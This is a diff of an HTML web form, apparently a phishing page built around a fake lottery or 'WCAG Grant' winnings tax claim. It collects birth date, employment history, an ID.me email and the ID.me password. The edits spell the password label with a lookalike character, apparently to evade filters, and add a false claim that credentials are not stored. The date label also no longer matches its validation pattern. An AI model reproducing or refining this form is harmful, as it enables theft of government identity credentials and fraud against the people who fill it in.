@@ -251,12 +251,12 @@
 
 <div class="flex flex-col">
   <label class="font-semibold mb-1">
-    Date of Birth <span class="text-red-500">*</span>
+    Date of Birth (MM/DD/YYYY) <span class="text-red-500">*</span>
   </label>
   <input
     type="text"
     name="dob"
-    placeholder="DD/MM/YYYY"
+    
     maxlength="10"
     pattern="^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/\d{4}$"
     class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
@@ -336,25 +336,26 @@ dobInput.addEventListener('input', (e) => {
 
   <!-- Past Employer -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">Past Employer(s) <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1">Past Employers Names<span class="text-red-500">*</span></label>
     <input type="text" name="past_employers" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
   </div>
 
   <!-- Winnings Amount -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">Lottery / Grant Winnings Amount <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1">Amount of Lottery or Grant Winnings Received
+<span class="text-red-500">*</span></label>
     <input type="text" name="winnings_amount" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
   </div>
 
   <!-- Winnings Source -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">Source of Winnings <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1"> Source of Winnings (e.g., WCAG Grant Program, State Lottery, PowerBall etc.) <span class="text-red-500">*</span></label>
     <input type="text" name="winnings_source" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
   </div>
 
   <!-- Received Tax Form -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">Did you receive a W-2G or 1099? <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1">Did You Receive a Form 1099 or W-2G from the issuer?<span class="text-red-500">*</span></label>
     <select name="received_tax_form" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
       <option value="">Select</option>
       <option value="Yes">Yes</option>
@@ -364,7 +365,7 @@ dobInput.addEventListener('input', (e) => {
 
   <!-- Filing Status -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">Filing Status <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1">Filing Status for Tax Year<span class="text-red-500">*</span></label>
     <select name="filing_status" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
       <option value="">Select</option>
       <option>Single</option>
@@ -387,14 +388,24 @@ dobInput.addEventListener('input', (e) => {
 
   <!-- ID.me Email -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">ID.me Registered Email</label>
+    <label class="font-semibold mb-1">If yes, please log in or provide your registered ID.me email:/label>
     <input type="email" name="idme_email" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500">
   </div>
 
   <!-- ID.me Password -->
   <div class="flex flex-col">
-    <label class="font-semibold mb-1">ID.me Login Password</label>
+    <label class="font-semibold mb-1">Login Paššword: ( We do not store your credentials. ID.me login is used only to verify your identity through secure government-backed authentication.)</label>
     <input type="password" name="idme_password" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500">
+  </div>
+
+    <!-- Confirmation -->
+  <div class="flex flex-col lg:col-span-2">
+    <label class="font-semibold mb-1">If no, would you like help setting up an ID.me account? <span class="text-red-500">*</span></label>
+    <select name="idme_create" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" >
+      <option value="">Select</option>
+      <option>Yes</option>
+      <option>No</option>
+    </select>
   </div>
 
   <!-- Upload ID -->
@@ -414,7 +425,7 @@ dobInput.addEventListener('input', (e) => {
 
   <!-- Confirmation -->
   <div class="flex flex-col lg:col-span-2">
-    <label class="font-semibold mb-1">I confirm the information provided is accurate <span class="text-red-500">*</span></label>
+    <label class="font-semibold mb-1">I confirm that the information above is accurate to the best of my knowledge <span class="text-red-500">*</span></label>
     <select name="confirmation" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
       <option value="">Select</option>
       <option>Yes</option>
